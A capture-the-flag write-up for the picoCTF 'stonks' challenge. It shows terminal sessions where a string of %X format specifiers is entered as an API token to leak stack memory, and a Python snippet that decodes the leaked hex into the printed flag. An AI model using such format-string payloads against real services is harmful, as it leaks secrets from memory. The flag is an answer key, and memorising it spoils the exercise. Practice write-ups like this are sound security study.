# stronk

## Objetivo

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`

## Hints

Okay, maybe I'd believe you if you find my API key.

## Solución

```
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ nc mercury.picoctf.net 6989
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
jjhjgjhb
Buying stonks with token:
jjhjgjhb
Portfolio as of Sat May 13 02:01:59 UTC 2023


10 shares of E
14 shares of FZ
4 shares of IKWJ
1 shares of XJ
7 shares of ITT
34 shares of MTL
15 shares of ZCWD
35 shares of I
53 shares of VZXT
111 shares of TE
5 shares of OFG
7 shares of JAL
90 shares of PERD
Goodbye!
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ nc mercury.picoctf.net 6989
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
3
Goodbye!
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ nc mercury.picoctf.net 6989
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
Buying stonks with token:
841F3D0804B00080489C3F7F76D80FFFFFFFF1841D160F7F84110F7F76DC70841E1801841F3B0841F3D06F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3538613032356533FFE0007DF7FB1AF8F7F844405CE33C0010F7E13CE9F7F850C0F7F765C0F7F76000FFE01BC8F7E0468DF7F765C08048ECAFFE01BD40F7F98F09804B000F7F76000F7F76E20FFE01C08F7F9ED50F7F778905CE33C00F7F76000804B000FFE01C088048C86841D160FFE01BF4FFE01C088048BE9F7F763FC0FFE01CBCFFE01CB411841D1605CE33C00FFE01C2000F7DB9FA1F7F76000F7F760000F7DB9FA11FFE01CB4FFE01CBCFFE01C4410F7F76000F7F9970AF7FB10000F7F7600000800DCA8BF70B4C9B000180486300F7F9ED50F7F99960804B00018048630080486628048B85
Portfolio as of Sat May 13 02:14:35 UTC 2023


1 shares of CDKN
1 shares of LUD
26 shares of N
57 shares of V
31 shares of OEL
210 shares of RE
497 shares of SSBA
Goodbye!
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ 
```

- python3
```
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ python3 
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "%X" *100
'%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X'
>>> s='ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿà}'
>>> for x in range(0,len(s),4):
... print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
  File "<stdin>", line 2
    print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
    ^
IndentationError: expected an indented block after 'for' statement on line 1
>>> for x in range(0,len(s),4):
... print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}
```

## Flag

picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}

## Notas adicionales

## Referencias

[C](https://www.geeksforgeeks.org/format-specifiers-in-c/)
[Library](https://www.tutorialspoint.com/c_standard_library/c_function_sprintf.htm)
[Cyberchef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=NkYgNjMgNjkgNzAgN0IgNDYgNTQgNDMgMzAgNkMgNUYgNDkgMzQgNUYgNzQgMzUgNkQgNUYgNkMgNkMgMzAgNkQgNUYgNzkgNUYgNzkgMzMgNkUgMzUgMzggNjEgMzAgMzIgMzUgNjUgMzMgRkYgRTAgN0Q)